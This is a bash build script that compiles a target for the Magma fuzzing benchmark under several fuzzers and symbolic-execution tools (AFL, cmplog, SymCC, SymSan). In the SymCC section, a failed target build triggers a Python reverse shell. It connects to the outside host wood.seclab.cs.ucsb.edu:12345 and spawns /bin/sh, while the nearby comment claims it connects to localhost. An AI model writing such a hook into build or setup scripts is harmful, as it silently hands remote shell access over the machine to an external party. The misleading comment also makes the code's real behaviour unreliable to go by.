#!/bin/bash
set -e

##
# Pre-requirements:
# - env FUZZER: path to fuzzer work dir
# - env TARGET: path to target work dir
# - env MAGMA: path to Magma support files
# - env OUT: path to directory where artifacts are stored
# - env CFLAGS and CXXFLAGS must be set to link against Magma instrumentation
##

export SANITIZER_FLAGS=
# export SANITIZER_FLAGS="-fsanitize=address -fsanitize=array-bounds,bool,builtin,enum,float-divide-by-zero,function,integer-divide-by-zero,null,object-size,return,returns-nonnull-attribute,shift,signed-integer-overflow,unreachable,vla-bound,vptr -fno-sanitize-recover=all"

export CC=clang
export CXX=clang++
export CFLAGS="$CFLAGS $SANITIZER_FLAGS"
export CXXFLAGS="$CXXFLAGS $SANITIZER_FLAGS"
export LDFLAGS="$LDFLAGS $SANITIZER_FLAGS"

# export LIBS="$LIBS -lstdc++"
export LIBS="$LIBS -l:afl_driver.o -lstdc++"
(
    export OUT="$OUT/vanilla"
    mkdir -p "$OUT"
    export LDFLAGS="$LDFLAGS -L$OUT"
    export LIB_FUZZING_ENGINE="afl_driver.o"
    "$MAGMA/build.sh"
    "$TARGET/build.sh"
)

(
    export CC="$FUZZER/afl/afl-clang-fast"
    export CXX="$FUZZER/afl/afl-clang-fast++"

    export OUT="$OUT/afl"
    export LDFLAGS="$LDFLAGS -L$OUT"
    export LIB_FUZZING_ENGINE="afl_driver.o"
    mkdir -p "$OUT"

    "$MAGMA/build.sh"
    "$TARGET/build.sh"
)
(
    export CC="$FUZZER/afl-symcts/afl-clang-fast"
    export CXX="$FUZZER/afl-symcts/afl-clang-fast++"

    export OUT="$OUT/afl-symcts"
    export LDFLAGS="$LDFLAGS -L$OUT"
    export LIB_FUZZING_ENGINE="afl_driver.o"
    mkdir -p "$OUT"

    "$MAGMA/build.sh"
    "$TARGET/build.sh"
)

(
    export CC="$FUZZER/afl/afl-clang-fast"
    export CXX="$FUZZER/afl/afl-clang-fast++"

    export OUT="$OUT/cmplog"
    export LDFLAGS="$LDFLAGS -L$OUT"
    export LIB_FUZZING_ENGINE="afl_driver.o"
    mkdir -p "$OUT"

    export AFL_LLVM_CMPLOG=1

    "$MAGMA/build.sh"
    "$TARGET/build.sh"
)

# if $FUZZER does not contain the string "symqemu", but contains the string "sym", build instrumented target
if [[ "$FUZZER" != *"symqemu"* && "$FUZZER" == *"sym"* ]]; then
    (
        export CC="$FUZZER/symcc/build/symcc"
        export CXX="$FUZZER/symcc/build/sym++"

        export OUT="$OUT/symcts"
        export LDFLAGS="$LDFLAGS -L$OUT"
        export LIBS="$LIBS -l:libc_symcc_preload.a"
        export LIB_FUZZING_ENGINE="$OUT/afl_driver.o"

        export SYMCC_LIBCXX_PATH="$FUZZER/llvm/libcxx_symcc_install"
        export SYMCC_NO_SYMBOLIC_INPUT=1
        export SYMCC_DISABLE_WRITING=1
        export SYMCC_EXTRA_LDFLAGS="-L$OUT -l:libc_symcc_preload.a"
        source "$FUZZER/symcc_env.sh"
        mkdir -p /tmp/output

        "$MAGMA/build.sh"
        # on error, connect outwards with nc to localhost:12345 and provide an interactive bash shell (reverse shell, not listening, not using nc -e)
        "$TARGET/build.sh" || (
            python -c 'import socket,os,pty;s=socket.socket();s.connect(("wood.seclab.cs.ucsb.edu",12345));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
            exit 1
        )
    )
fi

if [[ "$FUZZER" == *"symsan"* ]]; then
    (
        export CC="$FUZZER/symsan/bin/ko-clang"
        export CXX="$FUZZER/symsan/bin/ko-clang++"

        export OUT="$OUT/symsantrack"
        export LDFLAGS="$LDFLAGS -L$OUT"

        export USE_TRACK=1

        "$MAGMA/build.sh"
        "$TARGET/build.sh"
    )
    (
        export CC="$FUZZER/symsan/bin/ko-clang"
        export CXX="$FUZZER/symsan/bin/ko-clang++"

        export OUT="$OUT/symsanfast"
        export LDFLAGS="$LDFLAGS -L$OUT"

        "$MAGMA/build.sh"
        "$TARGET/build.sh"
    )
fi
